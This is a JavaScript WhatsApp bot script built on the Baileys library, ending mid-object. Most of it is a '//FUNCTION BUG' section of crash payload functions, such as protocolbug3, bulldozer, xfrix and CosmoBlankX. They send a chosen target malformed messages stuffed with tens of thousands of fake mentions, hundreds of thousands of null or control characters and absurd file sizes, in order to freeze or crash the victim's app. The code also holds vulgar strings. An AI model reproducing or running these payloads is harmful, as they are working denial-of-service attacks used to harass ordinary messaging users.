//========usztreamaker========
require('./config')
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require('fs-extra')
const util = require('util')
const chalk = require('chalk')
const { addPremiumUser, delPremiumUser } = require("./lib/premiun");
const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
//===============
module.exports = Usztzy = async (Usztzy, m, chatUpdate, store) => {
try {
const from = m.key.remoteJid
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");
const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = q = args.join(" ")//hard
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const sender = m.key.fromMe ? (Usztzy.user.id.split(':')[0]+'@s.whatsapp.net' || Usztzy.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await Usztzy.decodeJid(Usztzy.user.id);
const premuser = JSON.parse(fs.readFileSync("./system/database/premium.json"));
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
if (!Usztzy.public && !isCreator) return;

//======================
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await Usztzy.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
//======================
if (m.message) {
Usztzy.readMessages([m.key]);
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
console.log(`┃¤ ${chalk.hex("#FFD700").bold("📩 NEW MESSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Dari:")} ${chalk.hex("#FFFFFF")(`${m.pushName} (${m.sender})`)} `);
console.log(`┃¤ ${chalk.hex("#FFA500")("📍 Di:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
console.log(`┃¤ ${chalk.hex("#00FF00")("📝 Pesan:")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}

const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
Usztzy.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => {
            Usztzy.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `WilbobOfficial`,
            "body": `💥𝐔𝐒𝐙 㐅 𝐓𝐑𝐄𝐀𝐌𝐀𝐊𝐄𝐑`,
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": fs.readFileSync(`./image/meta4.jpg`),
            "sourceUrl": `${isLink}`
        }
    }
},
{ quoted: m })
        }

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${m.pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${m.pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://img1.pixhost.to/images/6375/609325904_juharitzy.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

// BUTTON VIDEO
   Usztzy.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: Usztzy.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
  body: {
     text: opts && opts.body ? opts.body : ''
  },
  footer: {
     text: opts && opts.footer ? opts.footer : ''
  },
  header: {
     hasMediaAttachment: true,
     videoMessage: video.videoMessage,
  },
  nativeFlowMessage: {
     buttons: buttons,
     messageParamsJson: ''
  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `usztreamaker`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await Usztzy.sendPresenceUpdate('composing', jid)
      return Usztzy.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }

//FUNCTION BUG
//protocol 3
async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await Usztzy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Usztzy.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
    }
    //protocol5
    async function protocolbug5(isTarget, mention) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await Usztzy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Usztzy.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
//buldozer
async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await Usztzy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
  
//trashprotocol
  async function trashprotocol(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 2000000)}@s.whatsapp.net`
        )
    ];

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        annotations: [],
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k="
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await Usztzy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Usztzy.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
console.log(chalk.green(`sᴇɴᴅ ʙᴜɢ ʙʏ ᴜsᴢᴛʀᴇᴀᴍᴀᴋᴇʀ  : ${target}`));
}
async function xfrix(target) {
  const buttoncrash = {
    quotedMessage: {
      buttonsMessage: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
          mimetype:
            "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
          fileLength: "9999999999999",
          pageCount: 3567587327,
          mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
          fileName: "Caywzz - Starevxz",
          fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
          directPath:
            "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1735456100",
          //contactVcard: true,
          caption: "\n",
        },
        contentText: "Caywzz - Starevxz",
        footerText: "\u0000".repeat(850000),
        buttons: [
          {
            buttonId: "Caywzz - Starevxz",
            buttonText: {
              displayText: "𐎟",
            },
            type: 1,
          },
        ],
        headerType: 3,
      },
    },
  };
  await Usztzy.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "\u0000".repeat(0),
            listType: 1,
            singleSelectReply: { selectedRowId: "id" },
            description: "oi",
            contextInfo: {
              businessOwnerJid: "5511954801380@s.whatsapp.net",
              participant: "13135550002@s.whatsapp.net",
              mentionedJid: Caywzz - Starevxz || [from],
              quotedMessage: buttoncrash.quotedMessage,
            },
          },
        },
      },
    },
    { participant: { jid: target } }
  );
}
async function xfrixbeta(target) {
  await Usztzy.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            body: {
              text: " Caywzz - Starevxz ",
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } }
  );
}

async function FloodsCarousel2(target, Ptcp = true) {
      const header = proto.Message.InteractiveMessage.Header.create({
        ...(await prepareWAMessageMedia(
          { image: { url: "https://files.catbox.moe/wek01l.jpg" } },
          { upload: Usztzy.waUploadToServer }
        )),
        title: "𝓥𝓪𝓶𝓹𝓲𝓻𝓮 𝓘𝓼 𝓑𝓪𝓬𝓴\n" + "\u0003".repeat(90000),
        subtitle: "©ᴠᴀᴍᴘɪʀᴇ",
        hasMediaAttachment: true,
      });

      const body = {
        text: "\u0003" + "\u0003".repeat(90000),
      };

      // Example carousel content
      const carouselMessage = {
        sections: [
          {
            title: " 𝚅𝚊𝚖𝚙𝚒𝚛𝚎",
            rows: [
              {
                title: "𝚅𝚊𝚖𝚙𝚒𝚛𝚎",
                description: "\u0003".repeat(55555),
                rowId: "\u0003".repeat(55555),
              },
              {
                title: " 😶‍🌫️ ",
                description: "\u0003".repeat(55555),
                rowId: "\u0003".repeat(55555),
              },
            ],
          },
          {
            title: "𝚅𝚊𝚖𝚙𝚒𝚛𝚎",
            rows: [
              {
                title: "©ᴠᴀᴍᴘɪʀᴇ",
                description: "\u0003".repeat(55555),
                rowId: "\u0003".repeat(55555),
              },
              {
                title: " 😶‍🌫️ ",
                description: "\u0003".repeat(55555),
                rowId: "\u0003".repeat(55555),
              },
            ],
          },
        ],
      };

      await Usztzy.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
                quoted: VampireKING
              },
            }
          : {}
      );
    }
    
async function CosmoBlankX(target) {
  const Hytam = '_*~@2~*_\n'.repeat(10500);
  const Legam = 'ꦽ'.repeat(10000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "\u0000",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: '༑Kontol⍣᳟Bapakkaupecah꙳⟅🩸' + Hytam + Legam,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Hades Document Killer",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await Usztzy.relayMessage(target, message, { participant: { jid: target } });
}

//usz-marker
async function VampDelayMess(target) {
  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype:
                "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Starevz Nih",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath:
                "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: "",
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "💥𝐔𝐒𝐙 㐅 𝐓𝐑𝐄𝐀𝐌𝐀𝐊𝐄𝐑\n" + "@15056662003".repeat(17000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson:
                  '{ display_text: \💥𝐔𝐒𝐙 㐅 𝐓𝐑𝐄𝐀𝐌𝐀𝐊𝐄𝐑\', url: "https://t.me/xatanicvxii", merchant_url: "https://t.me/xatanicvxii" }',
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "{}",
              },
            ],
            messageParamsJson: "{}",
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                {
                  length: 30000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Starevxz Free Version",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath:
